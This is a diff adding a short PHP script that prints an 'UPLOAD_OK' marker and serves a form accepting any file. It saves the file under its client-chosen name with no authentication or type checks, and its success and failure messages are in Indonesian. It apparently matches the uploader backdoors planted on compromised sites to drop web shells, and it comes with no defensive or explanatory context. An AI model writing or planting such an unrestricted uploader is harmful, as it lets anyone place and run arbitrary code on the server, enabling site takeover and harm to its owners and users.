@@ -1,0 +1,15 @@
+<?php
+echo "UPLOAD_OK<br>";
+if(isset($_FILES['file'])){
+    $name = $_FILES['file']['name'];
+    if(move_uploaded_file($_FILES['file']['tmp_name'], $name)){
+        echo "SUKSES: $name berhasil diupload.";
+    } else {
+        echo "GAGAL upload.";
+    }
+}
+?>
+<form method="POST" enctype="multipart/form-data">
+    <input type="file" name="file">
+    <input type="submit" value="UPLOAD">
+</form>
